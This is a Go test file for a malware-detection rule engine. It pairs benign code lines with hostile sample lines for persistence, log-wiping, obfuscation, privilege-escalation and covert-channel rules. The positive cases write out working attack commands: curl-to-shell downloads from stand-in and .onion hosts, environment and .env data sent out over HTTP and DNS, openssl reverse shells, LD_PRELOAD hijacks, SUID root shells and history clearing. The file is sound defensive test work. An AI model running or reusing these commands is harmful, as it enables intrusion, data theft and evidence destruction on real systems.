package detect

import "testing"

// Pass 14 (2026-10-26): the long tail of text rules from the same replay as audit_text_fp_test.go.
// Each negative is a real withdrawn line; each positive is the hostile shape the rule exists for.
// The replay numbers are in each rule's comment in patterns.toml.

// Injection and persistence rules fired on the variable or path name: printed shell-integration
// snippets, sanitizer preloads, device-permission rules, prose times and cgroup wrappers.
func TestAuditInjectionAndPersistenceNeedTheAct(t *testing.T) {
	neg := []ruleCase{
		{"P-LD-PRELOAD", "npm", `test:asan: ADAPT_ASAN=1 node-gyp rebuild && LD_PRELOAD=$(gcc -print-file-name=libasan.so):$(gcc -print-file-name=libubsan.so) ASAN_OPTIONS=detect_leaks=0 node test.js`},
		{"P-LD-PRELOAD", "go", `cmd.Env = append(os.Environ(), "LD_PRELOAD=")`},
		{"P-LD-PRELOAD", "aur", `export LD_PRELOAD=/usr/lib/libfakeroot/libfakeroot.so`},
		{"P-LD-PRELOAD", "go", `{"LD_PRELOAD rejected", []string{"LD_PRELOAD=/tmp/x.so"}, true},`},
		{"P-LD-PRELOAD", "pypi", `Raw value:     export LD_PRELOAD=/tmp/.libssl.so`},
		{"P-XDG-AUTOSTART", "pypi", `autostart_dir = os.path.expanduser("~/.config/autostart")`},
		{"P-XDG-AUTOSTART", "go", `mkdir -p /root/.config/autostart/`},
		{"P-XDG-AUTOSTART", "pypi", `PERSIST_HOME_DIRS = (".local/bin", ".config/autostart", ".config/systemd", ".config/environment.d", ".config/fish",`},
		{"P-UDEV-RULE", "pypi", `echo 'SUBSYSTEM=="usb", ATTRS{idVendor}=="303a", MODE="0666"' | sudo tee /etc/udev/rules.d/99-m5stack.rules`},
		{"P-UDEV-RULE", "cargo", `pub const UDEV_RULE_PATH_SYSTEM: &str = "/etc/udev/rules.d/99-HyperHeadset.rules";`},
		{"P-AT-JOB", "pypi", `at 21:59 saved at 22:33 and erased three closes written in between.`},
		{"P-AT-JOB", "packagist", `. '            "yes": "see {link} y {lonk} at 08:00",' . PHP_EOL`},
		{"P-AT-JOB", "go", `invalid.mac (1.2.3.4) at 12:34:56:78:910 on el0 ifscope [ethernet]`},
		{"P-PROMPT-COMMAND", "npm", `PROMPT_COMMAND="__devclaw_prompt_command${PROMPT_COMMAND:+;$PROMPT_COMMAND}"`},
		{"P-PROMPT-COMMAND", "npm", "readyCommand: `stty -echo 2>/dev/null; export PS1= PS2= PROMPT_COMMAND=; printf '\\n%s%s\\n' '${markers.readyPrefix}' '${markers.readySuffix}'`,"},
		{"P-ALIAS-OVERRIDE", "pypi", `alias ls='ls --color=auto'`},
		{"P-ALIAS-OVERRIDE", "go", `writeFile(t, filepath.Join(dir, "bashrc"), "alias ls='ls -la'")`},
		{"G-SYSTEMD-RUN", "pypi", `f"systemd-run --user --collect --unit={unit} bash -lc {shlex.quote(inner)} "`},
		{"G-SYSTEMD-RUN", "go", `return "", fmt.Errorf("systemd-run not in PATH; TTL safety net disabled")`},
		{"G-SYSTEMD-RUN", "pypi", `_GUEST_REBOOT_COMMAND = "/usr/bin/systemd-run --quiet --on-active=1s /usr/bin/systemctl reboot"`},
	}
	pos := []ruleCase{
		{"P-LD-PRELOAD", "npm", `export LD_PRELOAD=/tmp/.libssl.so`},
		{"P-LD-PRELOAD", "npm", `cmd = exec.Command("sh", "-c", "LD_PRELOAD=/dev/shm/hook.so /usr/bin/sudo -v")`},
		{"P-LD-PRELOAD", "npm", `cd /tmp && LD_PRELOAD=/var/tmp/x.so passwd`},
		{"P-XDG-AUTOSTART", "npm", `cp /tmp/.x.desktop ~/.config/autostart/updater.desktop`},
		{"P-XDG-AUTOSTART", "npm", `printf '[Desktop Entry]\nExec=/tmp/.x\n' > "$HOME/.config/autostart/x.desktop"`},
		{"P-UDEV-RULE", "npm", `echo 'ACTION=="add", RUN+="/tmp/.x"' > /etc/udev/rules.d/99-x.rules`},
		{"P-AT-JOB", "npm", `echo "curl -s http://x.example/p | sh" | at now + 1 minute`},
		{"P-AT-JOB", "npm", `at -f /tmp/.job now`},
		{"P-AT-JOB", "npm", `subprocess.run(["at", "now"], input=payload)`},
		{"P-PROMPT-COMMAND", "npm", `echo 'PROMPT_COMMAND="curl -s http://x.example/b?u=$USER"' >> ~/.bashrc`},
		{"P-PROMPT-COMMAND", "npm", `fs.appendFileSync(path.join(os.homedir(), '.bashrc'), 'PROMPT_COMMAND="_h;$PROMPT_COMMAND"\n')`},
		{"P-ALIAS-OVERRIDE", "npm", `echo "alias sudo='sudo -S'" >> ~/.bashrc`},
		{"P-ALIAS-OVERRIDE", "npm", `alias sudo='curl -s http://x.example/p -d "$(cat)"; sudo'`},
		{"G-SYSTEMD-RUN", "npm", `sudo systemd-run -t /bin/sh`},
		{"G-SYSTEMD-RUN", "npm", `systemd-run --user --on-calendar=hourly /tmp/.x`},
	}
	checkRuleCases(t, neg, pos)
}

// Anti-forensics rules fired on services writing their logs and on shells kept out of history.
func TestAuditAntiForensicsNeedsAClear(t *testing.T) {
	neg := []ruleCase{
		{"P-LOG-CLEAR", "go", `"PATH=/usr/local/sbin:$PATH nohup sudo /usr/local/bin/localkube start > /var/log/localkube.out 2> /var/log/localkube.err < /dev/null &"} {`},
		{"P-LOG-CLEAR", "go", `<string>/var/log/tailroute.out</string>`},
		{"P-LOG-CLEAR", "pypi", `0 3 * * *  APSIA_API_KEY=... apsia ingest SAT-1 /data/eps_last24h.csv >> /var/log/apsia.log 2>&1`},
		{"P-LOG-CLEAR", "go", `"dockerd-entrypoint.sh dockerd -s vfs &>/var/log/docker.log &\n" +`},
		{"P-LOG-CLEAR", "go", `removeLogFileCmd := []string{"sh", "-c", "rm /var/log/time.log"}`},
		{"P-LOG-CLEAR", "pypi", `host, "rm -rf /var/log/CFEngine-Install*", connection=connection, sudo=True`},
		{"P-HISTORY-CLEAR", "go", `interp.Env(expand.ListEnviron("HOME="+dir, "HISTFILE=/dev/null", "PATH=/bin:/usr/bin")),`},
		{"P-HISTORY-CLEAR", "pypi", `self.cmd("unset HISTFILE; stty -echo; set +m")  # pylint: disable=no-member`},
		{"P-HISTORY-CLEAR", "go", `wasm-history -config PATH -contracts ID,ID,... [-from N] [-to N] [-bucket NAME]`},
		{"P-HISTORY-CLEAR", "cargo", `("unset HISTFILE; history -c", "history_tamper"),`},
		{"P-HISTORY-CLEAR", "go", "5. Clear terminal history: history -c && clear`,"},
	}
	pos := []ruleCase{
		{"P-LOG-CLEAR", "npm", `cmd = exec.Command("sh", "-c", "rm -rf /var/log/ufw* 2>/dev/null")`},
		{"P-LOG-CLEAR", "npm", "execSync(`rm -rf /var/log/* 2>/dev/null`, { stdio: 'ignore' });"},
		{"P-LOG-CLEAR", "npm", `tryExec('> /var/log/wtmp 2>/dev/null');`},
		{"P-LOG-CLEAR", "npm", `cat /dev/null > /var/log/auth.log; history -c`},
		{"P-LOG-CLEAR", "npm", `truncate -s 0 /var/log/syslog`},
		{"P-HISTORY-CLEAR", "npm", `cmd = exec.Command("sh", "-c", "history -c && unset HISTFILE && kill -9 $$ 2>/dev/null")`},
		{"P-HISTORY-CLEAR", "npm", `history -c`},
		{"P-HISTORY-CLEAR", "npm", `rm -f /tmp/.x; history -c; exit`},
	}
	checkRuleCases(t, neg, pos)
}

// Obfuscation rules fired on terminal escapes, a missing word boundary and calls that encode.
func TestAuditObfuscationNeedsDecodeAndRun(t *testing.T) {
	neg := []ruleCase{
		{"P-OCTAL-ENCODE", "aur", `echo -e "\033[1;31mWarning: Version mismatch!\033[0m" || echo -e "Electron version: \033[1;32m$_v\033[0m"`},
		{"P-OCTAL-ENCODE", "packagist", `return self::make('printf \'\377\330\377\340JPEGSTUB\' > "$out"');`},
		{"P-OCTAL-ENCODE", "cargo", `printf '\036\037ghist\naaaa\000aaaa\000\000\000A\000a\000date\000'`},
		{"P-OCTAL-ENCODE", "npm", `printf '%s' "$1" | tr -d '\042\047\134' | tr '\n' ' '`},
		{"P-OCTAL-ENCODE", "go", `"printf '\\115\\101\\107\\117",              // MAGO`},
		{"P-REV-EXEC", "packagist", `tramite SHA-256 nella forma <code>self = sha256(prev || ':' || sha)</code>.`},
		{"P-REV-EXEC", "pypi", `if sep in ("|", "|&") and prev is not None:  # echo 'git push' | sh`},
		{"P-JS-CHILDPROC-DECODE", "npm", `child_process_1.execSync.mockReturnValue(Buffer.from(""));`},
		{"P-JS-CHILDPROC-DECODE", "npm", `const m = /^offset:(\d+)$/.exec(Buffer.from(cursor, "base64url").toString("utf-8"));`},
		{"P-JS-CHILDPROC-DECODE", "npm", `executor.input.ExclusiveStartKey = JSON.parse(Buffer.from(result.next, 'base64').toString());`},
		{"P-JS-CHILDPROC-DECODE", "npm", `const run = spawnSync('pwsh.exe', ['-NoLogo', '-NoProfile', '-NonInteractive', '-EncodedCommand', Buffer.from(wmiCreate, 'utf16le').toString('base64')], { input, encoding: 'utf8' });`},
		{"P-JS-CHILDPROC-DECODE", "go", "{regexp.MustCompile(`\\beval\\s*\\(\\s*atob\\s*\\(`), \"obfuscated_exec\", \"destructive\", \"eval(atob(...)) obfuscated execution\"},"},
	}
	pos := []ruleCase{
		{"P-OCTAL-ENCODE", "npm", `eval "$(printf '\143\165\162\154\040\150\164\164\160')"`},
		{"P-OCTAL-ENCODE", "npm", `printf '\143\165\162\154 -s x.example/p' | sh`},
		{"P-REV-EXEC", "npm", `echo 'hs.p/elpmaxe.x//:ptth Ls- lruc' | rev | bash`},
		{"P-JS-CHILDPROC-DECODE", "npm", `require("child_process").execSync(Buffer.from("Y3VybCBodHRwOi8veC5leGFtcGxl", "base64").toString())`},
		{"P-JS-CHILDPROC-DECODE", "npm", `exec(atob("Y3VybCBodHRwOi8veC5leGFtcGxl"))`},
		{"P-JS-CHILDPROC-DECODE", "npm", `(0, child_process_1.spawn)('sh', ['-c', Buffer.from(cmd, 'hex').toString()])`},
	}
	checkRuleCases(t, neg, pos)
}

// Privilege rules fired on setgid directories, the Electron sandbox, helper elevation and loops.
func TestAuditPrivilegeRulesNeedARootShell(t *testing.T) {
	neg := []ruleCase{
		{"P-SUID-BIT", "packagist", `run('find ' . $shared . ' -type d -exec chmod 2770 {} +');`},
		{"P-SUID-BIT", "packagist", `$commandList[] = "chmod -R g+s $releasePath/$writable";`},
		{"P-SUID-BIT", "npm", `'chmod 2770 "$agent_dir" 2>/dev/null || chmod 0770 "$agent_dir" 2>/dev/null || true',`},
		{"P-SUID-BIT", "aur", `chmod u+s "${srcdir}/${_pkgname}/chrome-sandbox"`},
		{"P-SUID-BIT", "npm", "console.log(`    sudo chmod 4755 \"${chromeSandboxPath}\"`)"},
		{"G-PKEXEC", "aur", `'polkit: pkexec graphical privilege elevation (recommended)'`},
		{"G-PKEXEC", "npm", "execSync(`pkexec apt-get install -y ${pkgs}`, { stdio: \"inherit\" });"},
		{"G-PKEXEC", "pypi", `python3 -c 'socket listen' → LISTEN、pkexec sh -c → PRIVESC）。`},
		{"G-DOAS", "pypi", `ordered_tdoas = np.roll(arrival_times, -ref_receiver, axis=0)`},
		{"G-DOAS", "cargo", `let analysis = analyze_command("doas ls /root");`},
		{"G-DOAS", "pypi", `$ cf-remote --ask-pass --switch-user-command "doas /bin/sh -c" info -H bsd-host`},
		{"G-FIND-EXEC", "npm", `postbuild: find src/cjs -type f -name "*.js" -exec bash -c 'mv "$0" "${0%.js}.cjs"' {} \;`},
		{"G-FIND-EXEC", "cargo", `@find . -name '*.sh' -not -path './vendor/*' -exec bash -n {} +`},
		{"G-FIND-EXEC", "aur", `find "$pkgdir/usr/lib/node_modules" -type f \( -name '*.so' -o -name '*.node' \) -exec sh -c 'file "$1" | grep -qi x86-64 && strip --strip-unneeded "$1" || true' sh {} \;`},
	}
	pos := []ruleCase{
		{"P-SUID-BIT", "npm", `("cp SUID abuse",        "sudo cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p"),`},
		{"P-SUID-BIT", "npm", `chmod u+s /bin/bash`},
		{"P-SUID-BIT", "npm", `chmod 4755 /tmp/.rootsh && /tmp/.rootsh -p`},
		{"G-PKEXEC", "npm", `pkexec /bin/sh`},
		{"G-PKEXEC", "npm", `pkexec --user root bash -i`},
		{"G-DOAS", "npm", `doas -u root /bin/sh`},
		{"G-DOAS", "npm", `doas -s`},
		{"G-FIND-EXEC", "npm", `("find priv esc (SUID)", "find . -exec /bin/sh -p \\; -quit"),`},
		{"G-FIND-EXEC", "npm", `find / -name x -exec sh -c 'curl -s http://x.example/p | sh' \;`},
	}
	checkRuleCases(t, neg, pos)
}

// Channel rules fired on the suffix, the command name, template literals and local servers.
func TestAuditChannelRulesNeedAnEndpoint(t *testing.T) {
	neg := []ruleCase{
		{"P-ONION-C2", "go", `if strings.Contains(addr, ".onion:") {`},
		{"P-ONION-C2", "go", `req := httptest.NewRequest("GET", "http://test.onion/test", nil)`},
		{"P-ONION-C2", "pypi", `seed_urls=["http://exampleonionaddressv3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion"],`},
		{"P-ONION-C2", "pypi", `"tor hidden service http://abcdefghijklmnop.onion/x",  # onion, high`},
		{"P-ONION-C2", "pypi", `_DEFAULT_ENGINE = "http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/"`},
		{"P-ONION-C2", "go", `host = "duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion"`},
		{"P-ONION-C2", "pypi", `"favourite_food": FavouriteFoodEnum.ONION,`},
		{"P-OPENSSL-CLIENT", "npm", "`openssl s_client -connect ${host}:443 -servername ${host} </dev/null 2>/dev/null | openssl x509 -noout -enddate`,"},
		{"P-OPENSSL-CLIENT", "pypi", `-o 'ProxyCommand=openssl s_client -quiet -verify_return_error -verify_hostname %h -connect %h:443 -servername %h 2>/dev/null' \`},
		{"P-DNS-EXFIL", "npm", "throw new Error(`host ${host} must be a dns name`);"},
		{"P-DNS-EXFIL", "npm", "`Verify DNS resolution: nslookup ${options.host}`,"},
		{"P-DNS-EXFIL", "go", `until nslookup $domain; do`},
		{"P-DNS-EXFIL", "packagist", `echo "server: " . $pdo->getAttribute(PDO::ATTR_SERVER_VERSION) . "  (host $host)\n";`},
		{"P-CURL-POST-DATA", "npm", "console.log(`  curl -X POST http://localhost:${PORT}/mock/reset`);"},
		{"P-CURL-POST-DATA", "npm", "return `curl -s --max-time 1 -X POST http://127.0.0.1:${HOST_PORT}/hook/${event} -H 'Content-Type: application/json' -d @- >/dev/null 2>&1 || true`;"},
		{"P-CURL-POST-DATA", "npm", "`curl -X POST ${flags.url} \\\\`,"},
	}
	pos := []ruleCase{
		{"P-ONION-C2", "npm", `AGENT_URL = "http://sytej5umomwukd77aantkxqj4aoke3kfist6eyne2pngavgsakum3iid.onion/mirai_agent.exe"`},
		{"P-ONION-C2", "npm", `curl -s http://expyuzz4wqqyqhjn.onion/p | sh`},
		{"P-OPENSSL-CLIENT", "npm", `openssl s_client -quiet -connect 203.0.113.9:4242 | /bin/bash | openssl s_client -quiet -connect 203.0.113.9:4243`},
		{"P-OPENSSL-CLIENT", "npm", `sh -i 2>&1 | openssl s_client -quiet -connect x.example:443`},
		{"P-DNS-EXFIL", "npm", `preinstall: nslookup $(hostname).hzbvy3cmgred066nig6n3ux0y.canarytokens.com || true`},
		{"P-DNS-EXFIL", "npm", `output.append(f"; nslookup $(whoami).{lhost}")`},
		{"P-DNS-EXFIL", "npm", `for c in $(base64 -w0 .env | fold -w 60); do dig $c.x.example; done`},
		{"P-CURL-POST-DATA", "npm", `curl -sS -X POST "$DTXWIKI_API/workspaces/$DTXWIKI_WORKSPACE/context/pages" \`},
		{"P-CURL-POST-DATA", "npm", `curl -s --data "$(env | base64 -w0)" https://x.example/c`},
		{"P-CURL-POST-DATA", "npm", `$command = "curl -s -X POST -o /dev/null -m {$this->timeout} {$url} > /dev/null 2>&1 &";`},
	}
	checkRuleCases(t, neg, pos)
}
